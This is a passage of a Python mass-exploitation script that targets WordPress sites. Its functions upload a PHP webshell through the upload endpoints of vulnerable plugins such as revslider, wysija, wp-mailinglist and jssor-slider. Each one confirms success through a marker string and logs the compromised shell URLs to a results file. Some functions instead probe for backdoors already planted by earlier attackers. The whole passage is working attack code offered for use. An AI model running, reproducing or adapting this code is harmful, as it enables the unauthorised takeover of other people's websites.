            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X190(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        postdir = url +'/wp-content/themes/multimedia1/server/php/'
        upload_dir = url +'/wp-content/themes/multimedia1/server/php/files/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X191(url):
    try:
        upload_dir = url +"/data.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X192(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpresss3cll/data.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X193(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpresssh3ll/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X194(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpresssh3ll-1/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X195(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpresssh3ll-2/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X196(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        upload_dir = url +"/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/TitaniumEx.php?Titanium=Ex"
        postdir = url+"/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php"
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X197(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        upload_dir = url +"/wp-admin/TitaniumEx.php?Titanium=Ex"
        postdir = url+"/wp-admin/options-general.php?page=wordpress_file_upload&action=edit_settings"
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X198(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        upload_dir = url +"/wp-content/plugins/logosware-suite-uploader/TitaniumEx.php?Titanium=Ex"
        postdir = url+"/wp-content/plugins/logosware-suite-uploader/lw-suite-uploader.php"
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X199(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        upload_dir = url +"/wp-content/uploads/i-dump-uploads/TitaniumEx.php?Titanium=Ex"
        postdir = url+"/wp-content/plugins/i-dump-iphone-to-wordpress-photo-uploader/uploader.php"
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X200(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        upload_dir = url +"/wp-content/uploads/levoslideshow/42_uploadfolder/big/TitaniumEx.php?Titanium=Ex"
        postdir = url+"/wp-admin/admin.php?page=levoslideshow_manage"
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X201(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        upload_dir = url +"/wp-content/jssor-slider/jssor-uploads/TitaniumEx.php?Titanium=Ex"
        postdir = url+"/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library"
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X202(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'Filedata':open (php, 'rb')}
        upload_dir = url +"/wp-content/plugins/logosware-suite-uploader/TitaniumEx.php?Titanium=Ex"
        postdir = url+"/wp-content/plugins/logosware-suite-uploader/lw-suite-uploader.php"
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X203(url):
    try:
        php = "files/TitaniumEx.php"
        zipp = "files/Files.zip"
        data = {'my-theme':open (zipp, 'rb')}
        payload = {'action':'themeupload',
						'submitter':'Upload',
						'overwriteexistingtheme':'on',
						'page':'GZNeFLoZAb'}
        upload_dir = url +"/wp-content/uploads/wysija/themes/TitaniumEx.php?Titanium=Ex"
        postdir = url+"/wp-admin/admin-post.php?page=wysija_campaigns&action=themes"
        xex = requests.post(postdir,files=data,data=payload,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X204(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        payload = {'settins_upload': 'settings', 'page': 'pagelines'}
        upload_dir = url +"/wp-content/TitaniumEx.php?Titanium=Ex"
        postdir = url+"/wp-admin/admin-post.php"
        xex = requests.post(postdir,files=data,data=payload,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X205(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'popimg':open (php, 'rb')}
        upload_dir = url +'/wp-content/uploads/'+str(x.year)+'/'+str(x.month)+'/TitaniumEx.php?Titanium=Ex'
        postdir = url+"/wp-admin/admin-ajax.php?action=getcountryuser&cs=2"
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X206(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        post = {'Settings2_upload': 'Settings2', 'page': 'pagelines'}
        upload_dir = url +'/wp-content/TitaniumEx.php?Titanium=Ex'
        postdir = url+"/wp-admin/admin-post.php"
        xex = requests.post(postdir,files=data,data=post,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X207(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        upload_dir = url +'/wp-content/uploads/wp-mailinglist/TitaniumEx.php?Titanium=Ex'
        postdir = url+"/wp-content/plugins/wp-mailinglist/vendors/uploadify/upload.php"
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X208(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        upload_dir = url +'/wp-content/plugins/wp-ajax-form-pro/ajax-form-app/uploader/uploads/TitaniumEx.php?Titanium=Ex'
        postdir = url+"/wp-content/plugins/wp-ajax-form-pro/ajax-form-app/uploader/do.upload.php?form_id=afp"
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X209(url):
    try:
        php = "files/TitaniumEx.php"
        data = {'file':open (php, 'rb')}
        upload_dir = url +'/wp-content/uploads/wp-mailinglist/TitaniumEx.php?Titanium=Ex'
        postdir = url+"/wp-content/plugins/wp-mailinglist/vendors/uploadify/upload.php"
        xex = requests.post(postdir,files=data,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X210(url):
    try:
        upload_dir = url +"/wp-content/plugins/wordpresss/up.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'input type="file" name="btul"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X211(url):
    try:
        zipp = "files/TitaniumEx.zip"
        php = "files/TitaniumEx.php"
        payload = {'action':'revslider_ajax_action',
						'client_action':'update_plugin'}
        data = {'update_file':open (zipp, 'rb')}
        postdir = url +'/wp-admin/admin-ajax.php'
        upload_dir = url +'/wp-content/plugins/revslider/temp/update_extract/TitaniumEx.php?Titanium=Ex'
        xex = requests.post(postdir,files=data,data=payload,headers=headers,verify=False,timeout=5)
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        
        if 'BIBIL_0DAY' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except KeyboardInterrupt:exit()
    except ConnectionError:print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.RED+"Failed"+Fore.LIGHTYELLOW_EX+"]")
    except:pass
def X212(url):
    try:
        upload_dir = url +"/izo.php"
        xe = requests.get(upload_dir,headers=headers,verify=False,timeout=5)
        if 'value="Upload"' in xe.text:
            print(Fore.LIGHTYELLOW_EX+"--| "+Fore.LIGHTWHITE_EX+url+Fore.LIGHTCYAN_EX+" ===> "+Fore.LIGHTYELLOW_EX+"["+Fore.LIGHTGREEN_EX+"Exploited"+Fore.LIGHTYELLOW_EX+"]")
            open("Results/Shells.txt","a").write(upload_dir+"\n")
            (upload_dir)
        else:
